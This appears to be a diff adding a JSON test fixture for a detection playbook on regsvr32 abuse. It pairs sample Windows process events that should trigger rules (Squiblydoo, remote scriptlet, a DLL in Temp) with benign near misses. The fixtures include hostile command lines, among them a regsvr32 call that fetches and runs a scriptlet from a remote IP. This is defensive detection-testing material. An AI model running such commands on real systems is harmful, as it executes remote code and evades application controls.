@@ -1,0 +1,77 @@
+{
+ "playbook": "signal_regsvr32_abuse",
+ "fires": [
+  {
+   "rule": "Regsvr32 Squiblydoo",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\regsvr32.exe",
+      "CommandLine": "regsvr32 /s /n /u /i:C:\\Users\\Public\\f.sct scrobj.dll",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "Regsvr32 Remote Scriptlet",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 1,
+      "windows.channel": "Microsoft-Windows-Sysmon/Operational",
+      "Image": "C:\\Windows\\System32\\regsvr32.exe",
+      "CommandLine": "regsvr32.exe /u /n /s /i:https://203.0.113.7/f.sct",
+      "User": "CORP\\alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "Regsvr32 From User Writable Path",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\regsvr32.exe",
+      "CommandLine": "regsvr32 /s C:\\Users\\alice\\AppData\\Local\\Temp\\x.dll",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  }
+ ],
+ "near_miss": [
+  {
+   "name": "registering an installed DLL",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\regsvr32.exe",
+      "CommandLine": "regsvr32 /s C:\\Program Files\\Vendor\\plugin.dll",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "name": "unregistering a system DLL",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\regsvr32.exe",
+      "CommandLine": "regsvr32 /u C:\\Windows\\System32\\vbscript.dll",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  }
+ ]
+}
